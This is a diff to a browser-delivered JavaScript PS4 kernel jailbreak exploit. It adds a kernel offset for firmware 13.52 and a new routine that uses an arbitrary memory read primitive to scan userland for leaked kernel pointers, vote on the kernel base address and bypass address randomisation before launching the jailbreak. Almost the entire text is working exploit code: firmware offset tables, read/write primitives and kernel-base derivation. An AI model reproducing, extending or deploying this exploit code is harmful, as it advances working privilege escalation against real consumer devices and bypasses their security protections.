@@ -495,7 +495,7 @@ var PS4_OFFSETS = {
     "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
     "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
     "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
+    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B9E5B8 }
 };
 
 // ========== PARAMETERS ==========
@@ -526,7 +526,7 @@ var SURVIVE_MS = (function(){
 })();
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 
-var REVISION = "genuine-u8-rw-22-1352";
+var REVISION = "genuine-u8-rw-23-1352";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -776,6 +776,143 @@ function kbaseScanProbeSummary() {
     if (bestScore > 0) mark("KBASE-SCAN-BEST-GUESS", hex(best) + "-score=" + bestScore);
 }
 
+var KPTR_ALIGN_MASK = ~0x1fffffn;
+
+function kernelImageBaseCandidate(b) {
+    if (!kptrBig(b)) return false;
+    if ((b & 0x1fffffn) !== 0n) return false;
+    var i;
+    for (i = 0; i < KBASE_LINK_BASES.length; i++) {
+        var lo = KBASE_LINK_BASES[i];
+        if (b >= lo && b <= lo + KBASE_SLIDE_MAX + 0x4000000n) return true;
+    }
+    return b >= 0xffffffff80000000n && b <= 0xffffffffa0000000n;
+}
+
+function deriveKbaseCandidatesFromKptr(k) {
+    if (!kptrBig(k)) return [];
+    var seen = {};
+    var out = [];
+    function push(b) {
+        if (!kernelImageBaseCandidate(b)) return;
+        var key = b.toString(16);
+        if (seen[key]) return;
+        seen[key] = 1;
+        out.push(b);
+    }
+    push(k & KPTR_ALIGN_MASK);
+    if (fwOffsets && fwOffsets.jmp != null) {
+        push((k - BigInt(firmwareJmpOffset())) & KPTR_ALIGN_MASK);
+    }
+    if (fwOffsets && fwOffsets.sysent != null) {
+        push((k - BigInt(fwOffsets.sysent) - 8n) & KPTR_ALIGN_MASK);
+    }
+    return out;
+}
+
+function userlandKptrScanRanges() {
+    var half = parseHexBig(Q.get("kbspan"), 0x600000n);
+    var spans = [];
+    if (isFinite(fakeAddress) && fakeAddress > 0) {
+        var lo = BigInt(Math.max(8, Math.floor(fakeAddress) - Number(half)));
+        var hi = BigInt(Math.floor(fakeAddress + Number(half)));
+        spans.push({ lo: lo, hi: hi, tag: "heap-anchor" });
+    }
+    if (isFinite(hostAddress) && hostAddress > 0) {
+        var lo2 = BigInt(Math.max(8, Math.floor(hostAddress) - Number(half)));
+        var hi2 = BigInt(Math.floor(hostAddress + Number(half)));
+        spans.push({ lo: lo2, hi: hi2, tag: "host-anchor" });
+    }
+    spans.push({ lo: 0x60000000n, hi: 0xc0000000n, tag: "user-lib-window" });
+    return spans;
+}
+
+function findKbaseViaUserlandKptrAsync(done) {
+    var ranges = userlandKptrScanRanges();
+    var step = parseHexBig(Q.get("kptrstep"), 0x80n);
+    if (step < 8n) step = 8n;
+    var chunk = parseInt(Q.get("kptrchunk") || "384", 10);
+    if (!isFinite(chunk) || chunk < 32) chunk = 384;
+    chunk = Math.min(2048, chunk);
+
+    var votes = {};
+    var kptrHits = 0;
+    var rangeIdx = 0;
+    var cur = 0n;
+    var dbgMode = Q.get("dbg") === "1";
+
+    mark("KPTR-SCAN-BEGIN", "ranges=" + ranges.length + "-step=" + hex(step));
+
+    function recordKptr(k) {
+        kptrHits++;
+        var cands = deriveKbaseCandidatesFromKptr(k);
+        for (var i = 0; i < cands.length; i++) {
+            var key = cands[i].toString(16);
+            votes[key] = (votes[key] || 0) + 1;
+        }
+        if (dbgMode && kptrHits <= 8) mark("KPTR-HIT", hex(k));
+    }
+
+    function finishKptrScan() {
+        mark("KPTR-SCAN-DONE", "kptrs=" + kptrHits);
+        var bestKey = null, bestVotes = 0;
+        for (var vk in votes) {
+            if (votes[vk] > bestVotes) {
+                bestVotes = votes[vk];
+                bestKey = vk;
+            }
+        }
+        if (bestKey == null || bestVotes < 1) {
+            mark("KBASE-KPTR-FAIL", "no-derived-base");
+            done(null);
+            return;
+        }
+        var kbase = BigInt("0x" + bestKey);
+        mark("KBASE-KPTR-VOTE", hex(kbase) + "-votes=" + bestVotes);
+        var vScore = kbaseScoreSample(kbaseSampleAt(kbase));
+        if (vScore > 0) {
+            mark("KBASE-KPTR-VERIFY", "score=" + vScore);
+        } else {
+            mark("KBASE-KPTR-UNVERIFIED", "save-as-?kb=" + hex(kbase));
+        }
+        done(kbase);
+    }
+
+    function tick() {
+        try {
+            var processed = 0;
+            while (rangeIdx < ranges.length && processed < chunk) {
+                var span = ranges[rangeIdx];
+                if (cur < span.lo) cur = span.lo;
+                if (cur >= span.hi) {
+                    rangeIdx++;
+                    cur = 0n;
+                    continue;
+                }
+                var addrNum = Number(cur);
+                if (addrNum >= 0 && isFinite(addrNum)) {
+                    var val = read64(cur);
+                    if (kptrBig(val)) recordKptr(val);
+                }
+                cur += step;
+                processed++;
+            }
+            if (rangeIdx >= ranges.length) {
+                finishKptrScan();
+                return;
+            }
+            if (dbgMode && processed > 0 && (kptrHits % 16 === 0)) {
+                mark("KPTR-SCAN-PROGRESS", "range=" + rangeIdx + "-at=" + hex(cur));
+            }
+            setTimeout(tick, 0);
+        } catch (error) {
+            mark("KPTR-SCAN-ERR", error.message);
+            finishKptrScan();
+        }
+    }
+    setTimeout(tick, 0);
+}
+
 function resolveKbaseAsync(done) {
     var manual = kernelBaseFromQuery();
     if (manual != null) {
@@ -795,12 +932,10 @@ function resolveKbaseAsync(done) {
     }
 
     probeKernelArwReachability();
-    if (!kernelArwLikely() && Q.get("kbforce") !== "1") {
-        mark("KBASE-SCAN-SKIP", "arw-not-kernel-visible");
-        mark("KBASE-NOTE", "slide-scan-needs-kernel-read-or-kptr-leak");
-        mark("KBASE-NOTE2", "try-poops-jit-chain-or-kbscan=0-blind-stub");
-        kbaseScanProbeSummary();
-        done(null);
+    var mode = (Q.get("kbmode") || "auto").toLowerCase();
+    if (mode === "kptr" || (!kernelArwLikely() && mode !== "slide" && Q.get("kbforce") !== "1")) {
+        mark("KBASE-PATH", "userland-kptr");
+        findKbaseViaUserlandKptrAsync(done);
         return;
     }
 
@@ -866,12 +1001,18 @@ function resolveKbaseAsync(done) {
 
 function scheduleKernelJailbreak() {
     resolveKbaseAsync(function (kbase) {
+        releasePreJailbreakMemory();
         if (kbase == null) {
             mark("JAILBREAK-ABORT", "no-valid-kbase");
             maybeAutoSave();
             return;
         }
-        runJailbreak(kbase);
+        if (Q.get("kbonly") === "1") {
+            mark("KBASE-ONLY-HALT", hex(kbase));
+            maybeAutoSave();
+            return;
+        }
+        setTimeout(function () { runJailbreak(kbase); }, JB_DELAY_MS);
     });
 }
 
@@ -1315,15 +1456,18 @@ function reportComposition() {
         attemptSucceeded = true;
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-        releasePreJailbreakMemory();
 
         /* HALT unless ?jb=1 — retail: batched heap drop before kernel */
         if (!testRun) {
             testRun = true;
             if (RUN_JAILBREAK) {
                 mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
-                setTimeout(scheduleKernelJailbreak, JB_DELAY_MS);
+                var kbStart = parseInt(Q.get("kbdelay") || "500", 10);
+                if (!isFinite(kbStart)) kbStart = 500;
+                kbStart = Math.max(0, Math.min(10000, kbStart));
+                setTimeout(scheduleKernelJailbreak, kbStart);
             } else {
+                releasePreJailbreakMemory();
                 mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
                 mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak");
                 setStatus("halted", "R/W PASS — HALTED", "kernel jailbreak skipped (add ?jb=1 to run)");
